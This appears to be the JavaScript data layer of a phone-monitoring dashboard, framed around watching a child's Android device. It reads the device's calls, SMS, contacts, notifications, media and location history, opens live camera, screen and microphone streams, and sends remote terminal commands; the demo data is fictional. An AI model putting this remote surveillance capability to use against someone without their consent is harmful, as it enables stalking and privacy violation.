// طبقة البيانات: مزوّد Firestore حقيقي + مزوّد تجريبي لاستعراض الواجهة بدون بيانات
import {
  collection, doc, getDoc, getDocs, onSnapshot,
  addDoc, deleteDoc, limit, serverTimestamp, where, query,
  setDoc, arrayUnion,
} from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
import { deleteObject, ref } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-storage.js";
import { db, storage } from "./firebase.js";
import { toDate } from "./util.js";

// المسار المتوقع للبيانات:
// users/{uid}/devices/{deviceId}/...
//  -(locations | calls | messages | notifications | contacts | media | commands)
// وكل الأجهزة also يمكن وضعها في مجموعة devices علوية مع الحقل ownerId

export function pick(obj, keys, dflt) {
  if (!obj || typeof obj !== "object") return dflt;
  for (const k of keys) {
    const v = obj[k];
    if (v !== undefined && v !== null && v !== "") return v;
  }
  return dflt;
}

export function normalizeLocation(loc) {
  if (!loc || typeof loc !== "object") return null;
  const lat = Number(pick(loc, ["lat", "latitude"], NaN));
  const lng = Number(pick(loc, ["lng", "lon", "long", "longitude"], NaN));
  if (!isFinite(lat) || !isFinite(lng) || (lat === 0 && lng === 0)) return null;
  return {
    lat,
    lng,
    accuracy: Number(pick(loc, ["accuracy", "acc"], 0)) || 0,
    address: pick(loc, ["address", "place", "label"], ""),
    timestamp: pick(loc, ["timestamp", "time", "createdAt", "date"], null),
  };
}

export function normalizeDevice(id, d = {}) {
  const battery = Number(pick(d, ["battery", "batteryLevel"], 0)) || 0;
  const conn = d.connection && typeof d.connection === "object" ? d.connection : d;
  const storageObj = d.storage && typeof d.storage === "object" ? d.storage : d;
  const used = Number(pick(storageObj, ["used", "storageUsed", "usedBytes"], 0)) || 0;
  const total = Number(pick(storageObj, ["total", "storageTotal", "totalBytes"], 0)) || 0;
  return {
    id,
    name: pick(d, ["name", "deviceName", "label"], "جهاز"),
    model: pick(d, ["model", "deviceModel"], "—"),
    platform: pick(d, ["platform", "os"], "android"),
    version: pick(d, ["version", "osVersion"], ""),
    battery: Math.max(0, Math.min(100, battery)),
    charging: !!pick(d, ["charging", "isCharging"], false),
    online: !!pick(d, ["online", "isOnline", "connected"], false),
    lastSeen: pick(d, ["lastSeen", "lastSeenAt", "updatedAt", "timestamp"], null),
    connection: {
      type: pick(conn, ["type", "connectionType", "kind"], ""),
      ssid: pick(conn, ["ssid", "name", "networkName"], ""),
    },
    storage: { used, total, percent: total ? Math.round((used / total) * 100) : null },
    location: normalizeLocation(pick(d, ["location", "lastLocation", "geo"], null)),
    raw: d,
  };
}

export function sortByDateDesc(list) {
  const dateOf = (it) => toDate(it?.timestamp ?? it?.createdAt ?? it?.time ?? it?.date ?? it?.updatedAt);
  return [...list].sort((a, b) => {
    const da = dateOf(a);
    const dbDate = dateOf(b);
    if (da && dbDate) return dbDate - da;
    if (da) return -1;
    if (dbDate) return 1;
    return 0;
  });
}

// ---------- مزوّد Firestore ----------

export async function listDevices(uid) {
  const out = [];

  // 1) المستخدم -> الأجهزة
  try {
    const snap = await getDocs(collection(db, "users", uid, "devices"));
    snap.forEach((d) => out.push(normalizeDevice(d.id, d.data())));
  } catch { /* تجاهل: قد لا توجد الصلاحية */ }

  // 2) حقل devices داخل وثيقة المستخدم
  if (!out.length) {
    try {
      const u = await getDoc(doc(db, "users", uid));
      const devs = u.exists() ? u.data().devices : null;
      if (Array.isArray(devs)) {
        devs.forEach((d) => out.push(normalizeDevice(d?.id || d?.deviceId, d)));
      } else if (devs && typeof devs === "object") {
        Object.entries(devs).forEach(([id, d]) => out.push(normalizeDevice(id, d)));
      }
    } catch { /* تجاهل */ }
  }

  // 3) مجموعة علوية devices مع ownerId
  if (!out.length) {
    try {
      const snap = await getDocs(query(collection(db, "devices"), where("ownerId", "==", uid)));
      snap.forEach((d) => out.push(normalizeDevice(d.id, d.data())));
    } catch { /* تجاهل */ }
  }

  return out;
}

export function subscribeDevice(uid, deviceId, cb) {
  let unsubTop = null;
  const unsubMain = onSnapshot(
    doc(db, "users", uid, "devices", deviceId),
    (snap) => {
      if (snap.exists()) {
        if (unsubTop) { unsubTop(); unsubTop = null; }
        cb(normalizeDevice(snap.id, snap.data()));
      } else if (!unsubTop) {
        unsubTop = onSnapshot(
          doc(db, "devices", deviceId),
          (s2) => cb(s2.exists() ? normalizeDevice(s2.id, s2.data()) : null),
          (err) => cb(null, err),
        );
      }
    },
    (err) => cb(null, err),
  );
  return () => {
    try { unsubMain(); } catch { /* تجاهل */ }
    try { if (unsubTop) unsubTop(); } catch { /* تجاهل */ }
  };
}

export function subscribeCollection(uid, deviceId, name, cb, opts = {}) {
  const lim = opts.limit || 200;
  return onSnapshot(
    collection(db, "users", uid, "devices", deviceId, name),
    (snap) => {
      const list = snap.docs.map((d) => ({ id: d.id, ...d.data() }));
      cb(sortByDateDesc(list).slice(0, lim));
    },
    (err) => cb(null, err),
  );
}

export async function sendCommand(uid, deviceId, type, payload = {}) {
  return addDoc(collection(db, "users", uid, "devices", deviceId, "commands"), {
    type,
    payload,
    status: "pending",
    createdAt: serverTimestamp(),
    updatedAt: serverTimestamp(),
  });
}

/** وثائق البث المباشر: front, back, screen, mic, location */
export function subscribeLive(uid, deviceId, cb) {
  return onSnapshot(
    collection(db, "users", uid, "devices", deviceId, "live"),
    (snap) => {
      const out = {};
      snap.forEach((d) => { out[d.id] = { id: d.id, ...d.data() }; });
      cb(out);
    },
    (err) => cb(null, err),
  );
}

/** متابعة نتيجة أمر واحد (للتريمينال). */
export function watchCommand(uid, deviceId, commandId, cb) {
  return onSnapshot(
    doc(db, "users", uid, "devices", deviceId, "commands", commandId),
    (snap) => cb(snap.exists() ? { id: snap.id, ...snap.data() } : null),
    () => cb(null),
  );
}

/** حذف جهاز قديم/مكرر مع بياناته (على دفعات محدودة لتوفير الحصة). */
export async function deleteDevice(uid, deviceId) {
  const subs = ["locations", "calls", "messages", "notifications", "contacts", "media", "commands", "live"];
  for (const name of subs) {
    try {
      const snap = await getDocs(query(
        collection(db, "users", uid, "devices", deviceId, name),
        limit(300),
      ));
      await Promise.all(snap.docs.map((d) => deleteDoc(d.ref).catch(() => {})));
    } catch { /* تجاهل */ }
  }
  try { await deleteDoc(doc(db, "users", uid, "devices", deviceId)); } catch { /* تجاهل */ }
}

/** حذف عنصر وسائط: وثيقة Firestore + الملف من Storage. */
export async function deleteMediaItem(uid, deviceId, item) {
  if (!item) return false;
  const paths = [];
  if (item.thumbPath) {
    let p = String(item.thumbPath).replace(/^\/+/, "");
    if (!p.startsWith("users/")) p = `users/${uid}/devices/${deviceId}/${p}`;
    paths.push(p);
  }
  const m = /\/o\/([^?]+)/.exec(String(item.url || ""));
  if (m) paths.push(decodeURIComponent(m[1]));
  for (const p of paths) {
    try { await deleteObject(ref(storage, p)); } catch { /* تجاهل */ }
  }
  if (item.id) {
    try { await deleteDoc(doc(db, "users", uid, "devices", deviceId, "media", item.id)); } catch { /* تجاهل */ }
  }
  return true;
}

/** قراءة وثيقة الجهاز مرة واحدة (لشرائح الاتصال مثلاً). */
export async function getDeviceOnce(uid, deviceId) {
  try {
    const snap = await getDoc(doc(db, "users", uid, "devices", deviceId));
    return snap.exists() ? normalizeDevice(snap.id, snap.data()) : null;
  } catch (e) {
    return null;
  }
}

/** حذف وثيقة من أي مجموعة (+ ملف Storage إن وُجد رابط) — للمكالمات والتسجيلات. */
export async function deleteDocItem(uid, deviceId, collectionName, item) {
  if (!item) return false;
  const paths = [];
  const m = /\/o\/([^?]+)/.exec(String(item.url || ""));
  if (m) paths.push(decodeURIComponent(m[1]));
  if (item.thumbPath) {
    let p = String(item.thumbPath).replace(/^\/+/, "");
    if (!p.startsWith("users/")) p = `users/${uid}/devices/${deviceId}/${p}`;
    paths.push(p);
  }
  for (const p of paths) {
    try { await deleteObject(ref(storage, p)); } catch { /* تجاهل */ }
  }
  if (item.id) {
    try { await deleteDoc(doc(db, "users", uid, "devices", deviceId, collectionName, item.id)); } catch { /* تجاهل */ }
  }
  return true;
}

// كاش قصير لبحث الأرقام (توفير قراءات Firestore)
const lookupCache = new Map();

async function cachedCollection(uid, deviceId, name, max) {
  const key = `${uid}:${deviceId}:${name}`;
  const hit = lookupCache.get(key);
  if (hit && Date.now() - hit.at < 5 * 60 * 1000) return hit.items;
  try {
    const snap = await getDocs(query(collection(db, "users", uid, "devices", deviceId, name), limit(max)));
    const items = snap.docs.map((d) => ({ id: d.id, ...d.data() }));
    lookupCache.set(key, { at: Date.now(), items });
    return items;
  } catch {
    return [];
  }
}

/**
 * بحث محلي عن رقم (بديل تروكولر): يبحث داخل جهات الاتصال والمكالمات والرسائل
 * لكل الأجهزة ويجمع الاسم والمصادر وآخر ظهور.
 */
export async function searchNumber(uid, deviceIds, rawQuery) {
  const bare = String(rawQuery || "").replace(/\D/g, "");
  if (bare.length < 3) return [];
  const out = new Map();
  const add = (it, source, deviceId, ts) => {
    const number = String(it.number || it.phone || it.address || "").trim();
    const digits = number.replace(/\D/g, "");
    if (!digits || !digits.includes(bare)) return;
    const cur = out.get(digits) || {
      number,
      digits,
      name: "",
      sources: new Set(),
      deviceId,
      lastAt: 0,
    };
    cur.sources.add(source);
    const name = String(it.name || it.contactName || it.displayName || "").trim();
    if (name && name !== number) cur.name = name;
    const at = toDate(ts)?.getTime() || 0;
    if (at > cur.lastAt) { cur.lastAt = at; cur.deviceId = deviceId; }
    out.set(digits, cur);
  };

  for (const deviceId of deviceIds) {
    const [contacts, calls, messages] = await Promise.all([
      cachedCollection(uid, deviceId, "contacts", 800),
      cachedCollection(uid, deviceId, "calls", 300),
      cachedCollection(uid, deviceId, "messages", 300),
    ]);
    contacts.forEach((it) => add(it, "جهة اتصال", deviceId, null));
    calls.forEach((it) => add(it, "مكالمة", deviceId, it.timestamp));
    messages.forEach((it) => add(it, "رسالة", deviceId, it.timestamp));
  }

  return Array.from(out.values())
    .map((v) => ({ ...v, sources: Array.from(v.sources) }))
    .sort((a, b) => (b.name ? 1 : 0) - (a.name ? 1 : 0) || b.lastAt - a.lastAt)
    .slice(0, 20);
}

/** إشارات WebRTC: كتابة حالة/طلب البث في live/rtc. */
export async function setRtc(uid, deviceId, data) {
  try {
    await setDoc(
      doc(db, "users", uid, "devices", deviceId, "live", "rtc"),
      { ...data, updatedAt: Date.now() },
      { merge: true },
    );
    return true;
  } catch {
    return false;
  }
}

/** إضافة ICE candidate من المتصفح إلى إشارات WebRTC. */
export async function addRtcCandidate(uid, deviceId, field, candidate) {
  try {
    await setDoc(
      doc(db, "users", uid, "devices", deviceId, "live", "rtc"),
      { [field]: arrayUnion(candidate), updatedAt: Date.now() },
      { merge: true },
    );
  } catch { /* تجاهل */ }
}

export function createFirestoreProvider() {
  return {
    mode: "firebase",
    listDevices,
    subscribeDevice,
    subscribeCollection,
    subscribeLive,
    watchCommand,
    sendCommand,
    deleteDevice,
    deleteMediaItem,
    deleteDocItem,
    getDeviceOnce,
    searchNumber,
    setRtc,
    addRtcCandidate,
  };
}

// ---------- المزوّد التجريبي ----------

export function createDemoProvider() {
  const GB = 1024 * 1024 * 1024;
  const now = Date.now();
  const iso = (minAgo) => new Date(now - minAgo * 60000).toISOString();

  const devices = [
    {
      id: "demo-device-1",
      name: "هاتف أحمد",
      model: "Samsung Galaxy A54",
      platform: "android",
      version: "One UI 6",
      battery: 76,
      charging: false,
      online: true,
      lastSeen: iso(1),
      connection: { type: "WiFi", ssid: "Home_5G" },
      storage: { used: 42 * GB, total: 128 * GB },
      location: { lat: 24.7136, lng: 46.6753, accuracy: 12, address: "الرياض — حي العليا", timestamp: iso(4) },
    },
    {
      id: "demo-device-2",
      name: "جهاز لوحي",
      model: "Huawei MatePad",
      platform: "android",
      version: "12",
      battery: 23,
      charging: true,
      online: false,
      lastSeen: iso(300),
      connection: { type: "cellular", ssid: "STC" },
      storage: { used: 8 * GB, total: 64 * GB },
      location: { lat: 24.7236, lng: 46.6853, accuracy: 40, address: "", timestamp: iso(300) },
    },
  ];

  const data = {
    "demo-device-1": {
      locations: [
        { lat: 24.7136, lng: 46.6753, accuracy: 12, address: "الرياض — حي العليا", timestamp: iso(4) },
        { lat: 24.7231, lng: 46.6852, accuracy: 18, address: "الرياض — طريق الملك فهد", timestamp: iso(38) },
        { lat: 24.7350, lng: 46.6500, accuracy: 25, address: "", timestamp: iso(95) },
        { lat: 24.7020, lng: 46.6401, accuracy: 30, address: "", timestamp: iso(180) },
        { lat: 24.6900, lng: 46.7200, accuracy: 22, address: "", timestamp: iso(300) },
        { lat: 24.7500, lng: 46.7000, accuracy: 15, address: "", timestamp: iso(480) },
        { lat: 24.7700, lng: 46.6600, accuracy: 40, address: "", timestamp: iso(700) },
        { lat: 24.7800, lng: 46.7500, accuracy: 20, address: "", timestamp: iso(1000) },
      ],
      calls: [
        { name: "أحمد", number: "0500000001", type: "incoming", duration: 320, timestamp: iso(12) },
        { name: "أم أحمد", number: "0500000002", type: "outgoing", duration: 95, timestamp: iso(60) },
        { name: "رقم غير معروف", number: "0555555555", type: "missed", duration: 0, timestamp: iso(150) },
        { name: "مدرسة أحمد", number: "0110000000", type: "incoming", duration: 210, timestamp: iso(300) },
        { name: "خالد", number: "0500000003", type: "outgoing", duration: 45, timestamp: iso(500) },
      ],
      messages: [
        { name: "أم أحمد", number: "0500000002", body: "ينزل معي إلى المدرسة اليوم", type: "inbox", timestamp: iso(20) },
        { name: "أبو أحمد", number: "0500000009", body: "هل وصلت إلى البيت؟", type: "inbox", timestamp: iso(90) },
        { name: "أحمد", number: "0500000001", body: "نعم وصلت الحمد لله", type: "sent", timestamp: iso(88) },
        { name: "مدرسة أحمد", number: "0110000000", body: "تذكير: اختبار الرياضيات غداً", type: "inbox", timestamp: iso(240) },
      ],
      notifications: [
        { app: "واتساب", title: "رسالة جديدة", body: "أم أحمد: ينزل معي", timestamp: iso(8) },
        { app: "Google", title: "تحديث متاح", body: "تحديث لتطبيق الخرائط", timestamp: iso(70) },
        { app: "الكاميرا", title: "مساحة التخزين", body: "تم استخدام 80% من المساحة", timestamp: iso(200) },
        { app: "البطارية", title: "بطارية منخفضة", body: "الشحن المتبقي 20%", timestamp: iso(400) },
      ],
      contacts: [
        { name: "أم أحمد", number: "0500000002" },
        { name: "أبو أحمد", number: "0500000009" },
        { name: "خالد", number: "0500000003" },
        { name: "مدرسة أحمد", number: "0110000000" },
        { name: "سارة", number: "0500000004" },
      ],
      media: [
        { name: "صورة-01.jpg", url: "https://picsum.photos/seed/kids1/600/600", type: "image", mimeType: "image/jpeg", size: 2400000, timestamp: iso(30) },
        { name: "صورة-02.jpg", url: "https://picsum.photos/seed/kids2/600/600", type: "image", mimeType: "image/jpeg", size: 1800000, timestamp: iso(120) },
        { name: "صورة-03.jpg", url: "https://picsum.photos/seed/kids3/600/600", type: "image", mimeType: "image/jpeg", size: 2100000, timestamp: iso(300) },
        { name: "صورة-04.jpg", url: "https://picsum.photos/seed/kids4/600/600", type: "image", mimeType: "image/jpeg", size: 1500000, timestamp: iso(600) },
        { name: "تقرير-المدرسة.pdf", url: "", type: "file", mimeType: "application/pdf", size: 850000, timestamp: iso(900) },
        { name: "تسجيل-صوتي.mp3", url: "", type: "file", mimeType: "audio/mpeg", size: 3200000, timestamp: iso(1400) },
      ],
      commands: [],
    },
    "demo-device-2": {
      locations: [], calls: [], messages: [], notifications: [], contacts: [], media: [], commands: [],
    },
  };

  const deviceListeners = new Map();
  const collListeners = [];
  const clone = (v) => JSON.parse(JSON.stringify(v));

  function emitDevice(deviceId) {
    const dev = devices.find((d) => d.id === deviceId) || null;
    (deviceListeners.get(deviceId) || []).forEach((cb) => cb(clone(dev)));
  }

  function emitCollection(deviceId, name) {
    const list = sortByDateDesc(data[deviceId]?.[name] || []);
    collListeners
      .filter((l) => l.deviceId === deviceId && l.name === name)
      .forEach((l) => l.cb(clone(list)));
  }

  return {
    mode: "demo",

    async listDevices() {
      return clone(devices);
    },

    subscribeDevice(uid, deviceId, cb) {
      const arr = deviceListeners.get(deviceId) || [];
      arr.push(cb);
      deviceListeners.set(deviceId, arr);
      setTimeout(() => {
        const dev = devices.find((d) => d.id === deviceId) || null;
        cb(clone(dev));
      }, 0);
      return () => {
        const cur = deviceListeners.get(deviceId) || [];
        deviceListeners.set(deviceId, cur.filter((f) => f !== cb));
      };
    },

    subscribeCollection(uid, deviceId, name, cb) {
      collListeners.push({ deviceId, name, cb });
      setTimeout(() => {
        cb(clone(sortByDateDesc(data[deviceId]?.[name] || [])));
      }, 0);
      return () => {
        const i = collListeners.findIndex((l) => l.cb === cb);
        if (i >= 0) collListeners.splice(i, 1);
      };
    },

    async sendCommand(uid, deviceId, type, payload = {}) {
      const cmd = {
        id: "cmd-" + Date.now(),
        type,
        payload,
        status: "pending",
        createdAt: new Date().toISOString(),
      };
      if (!data[deviceId]) {
        data[deviceId] = { locations: [], calls: [], messages: [], notifications: [], contacts: [], media: [], commands: [] };
      }
      data[deviceId].commands.unshift(cmd);
      emitCollection(deviceId, "commands");
      setTimeout(() => {
        cmd.status = "done";
        cmd.result = {
          ok: true,
          message: "تم التنفيذ (وضع تجريبي)",
          stdout: "demo@kids:~$ " + (payload.cmd || type) + "\nتم التنفيذ بنجاح",
          exitCode: 0,
        };
        emitCollection(deviceId, "commands");
      }, 1500);
      return cmd;
    },

    subscribeLive(uid, deviceId, cb) {
      const live = {
        front: { url: "", error: "", timestamp: new Date().toISOString() },
        back: { url: "", error: "", timestamp: new Date().toISOString() },
        screen: { url: "", error: "", timestamp: new Date().toISOString() },
        mic: { url: "", timestamp: new Date().toISOString() },
      };
      setTimeout(() => cb(clone(live)), 0);
      return () => {};
    },

    watchCommand(uid, deviceId, commandId, cb) {
      let timer = null;
      const started = Date.now();
      timer = setInterval(() => {
        const cmd = (data[deviceId]?.commands || []).find((c) => c.id === commandId);
        if (cmd) cb(clone(cmd));
        if (!cmd || Date.now() - started > 20000) {
          clearInterval(timer);
          if (!cmd) cb(null);
        }
      }, 800);
      return () => clearInterval(timer);
    },

    async deleteDevice(uid, deviceId) {
      const i = devices.findIndex((d) => d.id === deviceId);
      if (i >= 0) devices.splice(i, 1);
      return true;
    },

    async deleteMediaItem(uid, deviceId, item) {
      if (data[deviceId]?.media) {
        data[deviceId].media = data[deviceId].media.filter((m) => m.id !== item?.id);
        emitCollection(deviceId, "media");
      }
      return true;
    },

    async getDeviceOnce(uid, deviceId) {
      const d = devices.find((x) => x.id === deviceId);
      return d || null;
    },

    async deleteDocItem(uid, deviceId, collectionName, item) {
      const list = data[deviceId]?.[collectionName];
      if (Array.isArray(list)) {
        data[deviceId][collectionName] = list.filter((m) => m.id !== item?.id);
        emitCollection(deviceId, collectionName);
      }
      return true;
    },

    async searchNumber(uid, deviceIds, rawQuery) {
      const bare = String(rawQuery || "").replace(/\D/g, "");
      if (bare.length < 3) return [];
      const out = new Map();
      for (const deviceId of deviceIds) {
        const itemsOf = (name) => data[deviceId]?.[name] || [];
        const add = (it, source) => {
          const number = String(it.number || "").trim();
          const digits = number.replace(/\D/g, "");
          if (!digits.includes(bare)) return;
          const cur = out.get(digits) || { number, digits, name: "", sources: new Set(), deviceId, lastAt: 0 };
          cur.sources.add(source);
          if (it.name) cur.name = it.name;
          const at = toDate(it.timestamp)?.getTime() || 0;
          if (at > cur.lastAt) cur.lastAt = at;
          out.set(digits, cur);
        };
        itemsOf("contacts").forEach((it) => add(it, "جهة اتصال"));
        itemsOf("calls").forEach((it) => add(it, "مكالمة"));
        itemsOf("messages").forEach((it) => add(it, "رسالة"));
      }
      return Array.from(out.values())
        .map((v) => ({ ...v, sources: Array.from(v.sources) }))
        .sort((a, b) => (b.name ? 1 : 0) - (a.name ? 1 : 0) || b.lastAt - a.lastAt);
    },

    async setRtc() { return true; },
    async addRtcCandidate() { /* وضع تجريبي */ },
  };
}
